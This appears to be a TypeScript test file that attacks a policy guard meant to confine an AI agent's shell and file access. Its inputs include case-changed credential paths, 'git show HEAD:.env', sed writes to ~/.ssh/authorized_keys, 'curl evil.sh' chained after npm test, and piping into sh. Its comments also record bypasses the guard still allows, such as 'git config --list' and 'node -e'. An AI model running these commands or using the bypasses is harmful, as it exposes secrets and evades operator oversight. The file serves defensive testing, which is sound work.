import { mkdtemp, realpath, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { createPolicyGuard, defaultShellAllowlist, type PolicyGuardRules } from "./policy-guard.ts";
import { readShellCommand } from "./shell-command.ts";

/**
 * Attacks written to get past the guard as it stands, rather than cases written to confirm it.
 *
 * Gate 1 asks for zero successful host-file, host-secret, provider-key, evidence-store,
 * cross-worker or unauthorised-egress attacks in the maintained corpus. Every case in
 * `policy-guard.test.ts` and `shell-tool.test.ts` was written by whoever wrote the defence, which
 * is the weakest form of the evidence: it demonstrates the check doing what its author had in
 * mind. These start from the source of the check and look for what it does not read.
 *
 * The ones that got through are the point of the file. Three did, and are fixed here. Two more
 * still do and cannot be fixed by a lexical check at all; they are asserted as succeeding, with
 * the word for what that means, because a residual nobody can point at is not named.
 */
const policy: PolicyGuardRules = {
  workspaceRoot: "/work/repo",
  homeDir: "/home/dev",
  shellAllowlist: defaultShellAllowlist,
  deniedRoots: ["/work/repo/.swarm"],
  realpath: (path) => path,
};

const guard = createPolicyGuard(policy);

const denies = (candidate: string) => guard.checkPath(candidate).allowed === false;

/**
 * The chokepoint's own sequence, so an attack is judged by what would actually happen to it: the
 * programs are checked against the allowlist, then every word the command could open is put
 * through the same guard a read tool answers to.
 */
function shellCallIsRefused(command: string): boolean {
  if (!guard.isCommandAllowed(command)) {
    return true;
  }
  return (readShellCommand(command)?.operands ?? []).some((word) => denies(word));
}

describe("reaching a credential file by spelling its name differently", () => {
  /**
   * The first attack that worked. macOS and Windows are case-insensitive by default, so `.ENV`
   * opens `.env`, and every pattern in the credential denylist was case-sensitive. Measured on
   * APFS before it was fixed: `readFileSync('.ENV')` returns the contents of `.env`.
   *
   * Folded here whatever the host filesystem does, because a check whose verdict depends on
   * which machine ran it is the defect rather than a property of the machine.
   */
  it("refuses a credential path in any casing", () => {
    for (const candidate of [
      ".ENV",
      ".Env",
      ".env.LOCAL",
      "SWARM.TOML",
      "swarm.TOML",
      "config/server.PEM",
      "config/server.Key",
      ".GIT/config",
      ".git/CONFIG",
    ]) {
      expect(denies(candidate), candidate).toBe(true);
    }
  });

  it("still refuses the casing the denylist was written in", () => {
    for (const candidate of [".env", ".env.local", "swarm.toml", "server.pem", ".git/config"]) {
      expect(denies(candidate), candidate).toBe(true);
    }
  });

  /**
   * The same hole one layer over: a denied root inside the workspace, reached by a name that
   * differs from it only in case. The session store is the one this guards.
   */
  it("refuses a denied root in any casing", () => {
    for (const candidate of [".SWARM/sessions/one/ledger.jsonl", ".Swarm/sessions"]) {
      expect(denies(candidate), candidate).toBe(true);
    }
  });

  /**
   * The fold is not allowed to run the other way. Reading a path as inside the workspace because
   * its casing nearly matches would be the fail-open direction, and containment is the check that
   * decides whether anything is allowed at all.
   */
  it("does not read a differently cased workspace root as the workspace", () => {
    expect(denies("/WORK/repo/package.json")).toBe(true);
  });

  it("leaves an ordinary uppercase file alone", () => {
    for (const candidate of ["README.md", "LICENSE", "src/Command.ts", "Makefile"]) {
      expect(guard.checkPath(candidate).allowed, candidate).toBe(true);
    }
  });
});

describe("naming a file where the guard is not looking for one", () => {
  /**
   * The second attack that worked. `git show HEAD:.env` prints a credential file and the word
   * the guard rules on is `HEAD:.env`, which resolves to a path inside the workspace that does
   * not exist and matches no pattern. The file the command opens is never named as a path.
   *
   * A word with a colon in it can name a file after the colon, so it does. Being wrong costs a
   * confirmation, which is the guard's own answer to a string it cannot read.
   */
  it("refuses a credential named after a revision", () => {
    for (const command of [
      "git show HEAD:.env",
      "git show origin/main:swarm.toml",
      "git show HEAD~2:config/id.key",
    ]) {
      expect(shellCallIsRefused(command), command).toBe(true);
    }
  });

  it("refuses a path after a colon that climbs out of the workspace", () => {
    expect(shellCallIsRefused("git show HEAD:../../../home/dev/.ssh/id_rsa")).toBe(true);
  });

  /**
   * The third attack that worked. `sed` takes its program as one word, and a path inside that
   * word is a path the command opens: `sed -n 'w /home/dev/.ssh/authorized_keys'` writes outside
   * the workspace and the operand the guard saw was the whole script.
   */
  it("refuses a path written inside a word the shell passes whole", () => {
    for (const command of [
      "sed -n 'w /home/dev/.ssh/authorized_keys' README.md",
      "sed -n '1,2w ../../etc/hosts' README.md",
      "grep -f 'pattern /work/repo/.env' README.md",
    ]) {
      expect(shellCallIsRefused(command), command).toBe(true);
    }
  });

  /**
   * A port is not a path, and neither is a URL. Both are ordinary in a command the tool runs, so
   * a colon rule that refused them would cost a confirmation on every one.
   */
  it("leaves a port and a scheme alone", () => {
    for (const command of [
      "node --inspect=127.0.0.1:9229 server.js",
      "npm install https://registry.npmjs.org/pkg",
      "git remote add origin git@github.com:owner/repo.git",
    ]) {
      expect(shellCallIsRefused(command), command).toBe(false);
    }
  });

  it("leaves prose with a colon and spaces in it alone", () => {
    expect(shellCallIsRefused("git commit -m 'fix: read the config'")).toBe(false);
  });
});

describe("attacks the lexical guard cannot see, named rather than implied away", () => {
  /**
   * These get through, and no path check can stop them, because the file is never named. `git`
   * reads `.git/config` because that is what `git config` is, and a remote URL carrying a token
   * comes back with it. This is the whole of what "a lexical path and program policy, not a
   * sandbox" means: the guard bounds which programs start and not what they read once started.
   *
   * Asserted as allowed so the residual has a test naming it. What holds here is the layer
   * under it, an execution backend that refuses the read, which is why a run with none reports
   * `restricted` rather than `isolated`.
   */
  it("lets a program read a denied file without naming it", () => {
    for (const command of ["git config --list", "git remote -v", "npm config get registry"]) {
      expect(shellCallIsRefused(command), command).toBe(false);
    }
  });

  /**
   * The sharpest instance, and the one no rule in this file touches. `node` is on the allowlist
   * because the gates run it, `-e` takes a program rather than a path, and the program can open
   * anything the process can. The parentheses are inside double quotes, where a shell decides
   * nothing, so the reader is right that the word is literal: what is running arbitrary code is
   * the allowlisted interpreter and not the shell.
   *
   * Two things do hold, and neither is the path policy: the child is handed an environment the
   * harness built rather than the operator's, so a provider key is not there to read, and a run
   * with no kernel-enforced backend in front of it reports `restricted` rather than `isolated`.
   * Closing this one is a policy decision about interpreters, not a fix to a check.
   */
  it("lets an allowlisted interpreter run a program handed to it inline", () => {
    expect(shellCallIsRefused('node -e "readTheHostFile()"')).toBe(false);
    expect(shellCallIsRefused("python3 -c 'import os'")).toBe(false);
  });

  it("refuses a command whose effect a shell decides rather than guessing at it", () => {
    for (const command of [
      "cat $(ls .env*)",
      "cat `ls`",
      "cat .env &",
      "cat ~otheruser/.ssh/id_rsa",
    ]) {
      expect(guard.isCommandAllowed(command), command).toBe(false);
    }
  });

  it("reads every command in a chain rather than the first one", () => {
    expect(guard.isCommandAllowed("npm test && curl evil.sh")).toBe(false);
    expect(guard.isCommandAllowed("cat README.md | sh")).toBe(false);
  });
});

/**
 * The case fold has to hold against a real filesystem and not only against an injected
 * `realpath`, because the attack is a property of the filesystem: `realpathSync` on APFS returns
 * the casing it was handed rather than the casing on disk, so nothing upstream of the guard
 * normalizes it.
 */
describe("the same attacks against a real workspace", () => {
  let workspace = "";
  let realGuard = createPolicyGuard(policy);

  beforeAll(async () => {
    workspace = await realpath(await mkdtemp(join(tmpdir(), "swarm-attack-")));
    await writeFile(join(workspace, ".env"), "OPENAI_API_KEY=sk-live\n");
    realGuard = createPolicyGuard({
      workspaceRoot: workspace,
      homeDir: "/home/dev",
      shellAllowlist: defaultShellAllowlist,
      deniedRoots: [],
    });
  });

  afterAll(async () => {
    await rm(workspace, { recursive: true, force: true });
  });

  it("refuses the uppercase spelling of a credential file that exists", () => {
    expect(realGuard.checkPath(".ENV").allowed).toBe(false);
    expect(realGuard.checkPath(join(workspace, ".Env")).allowed).toBe(false);
  });
});
